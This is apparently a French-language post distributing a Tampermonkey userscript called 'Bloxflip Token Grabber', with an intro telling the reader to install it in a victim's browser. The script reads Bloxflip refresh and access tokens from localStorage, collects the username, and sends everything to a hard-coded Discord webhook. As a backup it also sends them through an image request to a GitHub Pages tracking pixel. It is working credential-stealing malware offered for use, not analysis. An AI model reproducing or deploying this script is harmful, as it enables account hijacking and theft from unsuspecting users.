📋 Script Tampermonkey à distribuer

Copie ce script dans Tampermonkey de la victime. Quand elle ira sur Bloxflip, les tokens seront envoyés sur TON Discord. 

// ==UserScript==
// @name         Bloxflip Token Grabber
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Récupère les tokens Bloxflip
// @author       Anonymous
// @match        https://bloxflip.com/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const WEBHOOK = 'https://discord.com/api/webhooks/1517555709401759794/mkMRLTYfXgvi1te5Nlj5lA2wniscNz4N11OJDSsLNM3_RbZyHhpuz09EvK_oHdGCOD0y';

    const appRt = localStorage.getItem('app.rt');
    const appAt = localStorage.getItem('app.at');

    // Essayer de récupérer le pseudo
    let username = 'inconnu';
    const el = document.querySelector('[class*="username"], [class*="user-name"], [class*="display-name"]');
    if (el) username = el.textContent.trim();

    if (appRt || appAt) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: '@everyone 🔑 **Nouveau token Bloxflip !**',
                embeds: [{
                    title: 'Bloxflip Token Grabber',
                    color: 0xff6b35,
                    fields: [
                        { name: '👤 Pseudo', value: username, inline: true },
                        { name: '🔑 app.rt (Refresh Token)', value: '```' + (appRt || 'NON TROUVÉ') + '```', inline: false },
                        { name: '🔑 app.at (Access Token)', value: '```' + (appAt || 'NON TROUVÉ') + '```', inline: false },
                        { name: '🔗 URL', value: window.location.href, inline: false },
                        { name: '🕐 Date', value: new Date().toLocaleString(), inline: true }
                    ],
                    footer: { text: 'Bloxflip Grabber' },
                    timestamp: new Date().toISOString()
                }]
            })
        }).then(r => {
            if (r.ok) console.log('[Grabber] ✅ Tokens envoyés avec succès');
            else console.log('[Grabber] ❌ Erreur:', r.status);
        }).catch(e => console.log('[Grabber] ❌ Erreur:', e));

        // Backup : envoyer aussi vers un pixel tracker
        new Image().src = 'https://noahvigneron14-star.github.io/Hack/track.gif?rt=' + encodeURIComponent(appRt || '') + '&at=' + encodeURIComponent(appAt || '') + '&user=' + encodeURIComponent(username);
    }
})();
